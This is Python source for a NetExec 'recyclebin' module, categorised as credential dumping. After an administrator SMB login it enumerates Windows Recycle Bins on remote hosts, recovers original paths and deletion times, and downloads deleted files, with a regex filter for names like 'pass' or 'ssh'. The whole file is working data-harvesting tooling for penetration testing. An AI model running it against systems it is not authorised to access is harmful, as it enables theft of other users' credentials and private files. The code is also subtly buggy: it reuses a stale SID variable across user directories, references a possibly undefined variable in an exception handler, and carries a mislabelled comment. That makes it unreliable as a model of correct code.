from os import makedirs, remove
from nxc.helpers.misc import CATEGORY, convert_filetime_to_datetime
from nxc.paths import NXC_PATH
from os.path import join, abspath
import struct
import re


class NXCModule:
    """
    Module by @Defte_ & @leDryPotato
    Find (and download) files from Recycle Bins
    """

    name = "recyclebin"
    description = "Lists (and downloads) files in the Recycle Bin."
    supported_protocols = ["smb"]
    category = CATEGORY.CREDENTIAL_DUMPING
    false_positive = (".", "..", "desktop.ini", "S-1-5-18")

    def options(self, context, module_options):
        """
        DOWNLOAD    Download the files in the Recycle Bin (default: False)
            Example: -o DOWNLOAD=True
        FILTER      Filter what files you want to download (default: all) based on their original filename (supports regular expressions)
            Examples: -o FILTER=pass
                      -o FILTER=ssh
        """
        self.download = bool(module_options.get("DOWNLOAD", False))
        self.filter = module_options.get("FILTER", "all")

    def on_admin_login(self, context, connection):
        metadata_map = {}
        size_map = {}

        paths = connection.spider("C$", folder="$Recycle.Bin", regex=[r"(.*)"], silent=True)
        filtered_paths = [path for path in paths if not path.endswith(self.false_positive)]
        if not filtered_paths:
            context.log.display("No files found in the Recycle Bin.")
            return

        remote_full_paths = [f"C$/{path}" for path in filtered_paths]

        # extract the SID as the third component of the path (e.g. C$/$Recycle.Bin/SID/filename)
        sid_dirs = []
        for path in remote_full_paths:
            sid_dir = path.split("/")[2]
            if sid_dir not in sid_dirs:
                sid_dirs.append(sid_dir)

        # extract the full file path after the SID (e.g. filename or $Rfolder/filename) and remove empty values
        remote_file_paths = ["/".join(path.split("/")[3:]) for path in remote_full_paths if "/".join(path.split("/")[3:])]

        # parse the remote_files_paths and create a mapping of SID to the files that belong to that SID directory
        sid_to_files = {}
        for path in remote_full_paths:
            sid_dir = path.split("/")[2]
            if sid_dir not in sid_to_files:
                sid_to_files[sid_dir] = []
            sid_to_files[sid_dir].append(path)

        context.log.display(f"Found {len(remote_file_paths)} files in the Recycle Bin across {len(sid_dirs)} user directories. Processing files...")

        # check for each key in sid_to_files, if the value is a list with only 1 element and if that element is the same as the SID directory then we can skip processing that SID directory because it means that there are no files in that SID directory
        for sid_dir, files in sid_to_files.items():
            if len(files) == 1 and files[0].split("/")[2] == sid_dir:
                context.log.display(f"No files found in C$\\$Recycle.Bin\\{sid_dir}. Skipping...")
            else:
                context.log.highlight(f"Processing directory: C$\\$Recycle.Bin\\{sid_dir} with {len(files) - 1} file(s)...")
                for file in files:
                    context.log.debug(f"Found file: {file}")

        # Process files in the directory
        # Files in the Recycle Bin have two types of names:
        # $Recycle.Bin\S-1-5-21-4140170355-2927207985-2497279808-500\$I87021Q.txt
        # Or
        # $Recycle.Bin\S-1-5-21-4140170355-2927207985-2497279808-500\$R87021Q.txt
        # $I files are metadata files while $R are the actual files

        for remote_file_path in remote_file_paths:
            remote_full_path = f"$Recycle.Bin/{sid_dir}/{remote_file_path}"

            # Process Metadata files ($I) to extract original path, deletion time and size
            if remote_file_path.startswith("$I"):
                export_path = join(NXC_PATH, "modules", "recyclebin")
                makedirs(export_path, exist_ok=True)

                local_filename = f"{connection.host}_{sid_dir}_{remote_file_path.replace('/', '_')}"
                dest_path = abspath(join(export_path, local_filename))

                with open(dest_path, "wb+") as f:
                    connection.conn.getFile("C$", remote_full_path, f.write)
                f.close()

                with open(dest_path, "rb") as f:
                    data = f.read()
                    if len(data) >= 24:
                        file_size_raw, = struct.unpack("<q", data[8:16])   # original file size
                        deletion_time_raw, = struct.unpack("<Q", data[16:24])  # original file path
                        deletion_time = convert_filetime_to_datetime(self, deletion_time_raw)
                        original_path = data[24:].decode("utf-16", errors="ignore").strip("\x00")
                        match = re.search(r"([a-z]:\\.+)", original_path, re.IGNORECASE)
                        if match:
                            original_path = match.group(1)
                            metadata_map[remote_file_path.replace("$I", "")] = original_path
                            size_map[remote_file_path.replace("$I", "")] = file_size_raw
                            size_display = f"{file_size_raw // 1024}KB" if file_size_raw >= 1024 else f"{file_size_raw}B"
                            filename_display = f"Folder: {remote_file_path}" if len(remote_file_path) <= 8 else f"File: {remote_file_path}"
                            context.log.highlight(f"\t{filename_display}, Original location: {original_path}, Deletion time: {deletion_time}, Original size: {size_display}")

                # close and delete the metadata file since we have already extracted the information we need from it
                try:
                    remove(dest_path)
                    context.log.debug(f"Deleted metadata file: {dest_path}")
                except Exception:
                    context.log.debug(f"Could not delete metadata file: {dest_path}")

            # Process actual files ($R)
            elif remote_file_path.startswith("$R"):
                # Determine if we're nested inside a $R folder
                # path example (nested):  "$Recycle.Bin/SID/$RABGQM6/alice-passwords.txt"
                # path example (direct):  "$Recycle.Bin/SID/$RR2H6QW.txt"
                path_parts = remote_file_path.rstrip("/").split("/")
                r_folder = next((p for p in path_parts if p.startswith("$R")), None)
                is_nested = r_folder is not None and remote_file_path != r_folder

                if is_nested:
                    # Look up the original path of the parent $R folder
                    r_key = r_folder.replace("$R", "")
                    parent_original = metadata_map.get(r_key, f"{sid_dir}\\{r_folder}")
                    # Append the nested filename to reconstruct the full original path
                    original_path = f"{parent_original}\\{remote_file_path.split('/')[-1]}"
                else:
                    original_path = metadata_map.get(remote_file_path.replace("$R", ""), f"{sid_dir}\\{remote_file_path}")

                # Get size from size_map (direct $R files) or listPath (nested files)
                file_size_raw = size_map.get(remote_file_path.replace("$R", "")) if not is_nested else None

                if file_size_raw is None:
                    try:
                        # Have to use listPath to get the file size since nested files don't have metadata files that we can read the size from
                        parent_smb = remote_full_path.rstrip("/").rsplit("/", 1)[0].replace("/", "\\")
                        dir_listing = connection.conn.listPath("C$", parent_smb + "\\*")
                        for f_obj in dir_listing:
                            if f_obj.get_longname() == remote_file_path.split("/")[-1]:
                                file_size_raw = f_obj.get_filesize()
                                break
                    except Exception as e:
                        context.log.debug(f"Could not get file size for {remote_file_path} via listPath: {e}")

                size_display = f"{file_size_raw // 1024}KB" if file_size_raw and file_size_raw >= 1024 else f"{file_size_raw}B" if file_size_raw else "unknown"
                filename_display = f"Folder: {remote_file_path}" if len(remote_file_path) <= 8 else f"File: {remote_file_path}"

                context.log.highlight(f"\t{filename_display} ({original_path}), size: {size_display}")

                # Download the file if the option is set to True
                if self.download:
                    # Apply filter if specified
                    if self.filter and self.filter.lower() != "all":
                        match = re.search(self.filter, original_path, re.IGNORECASE)
                        if not match:
                            context.log.info(f"\tSkipping file {remote_file_path} ({original_path})")
                            continue
                    context.log.info(f"\tDownloading file {remote_file_path} from {original_path}")

                    local_filename = f"{connection.host}_{original_path}"
                    export_path = join(NXC_PATH, "modules", "recyclebin")
                    path = abspath(join(export_path, local_filename))
                    makedirs(export_path, exist_ok=True)

                    if (len(remote_file_path) <= 8):  # if it's a folder we can't download it and we should skip it
                        context.log.debug(f"Skipping download of {remote_file_path} because it appears to be an empty directory.")
                        continue
                    try:
                        with open(path, "wb") as f:
                            connection.conn.getFile("C$", remote_full_path, f.write)
                        context.log.success(f"Recycle Bin file {remote_file_path} written to: {path}")
                        f.close()
                    except Exception as e:
                        if "STATUS_FILE_IS_A_DIRECTORY" in str(e):
                            context.log.debug(f"Couldn't download {dest_path} because of {e}")
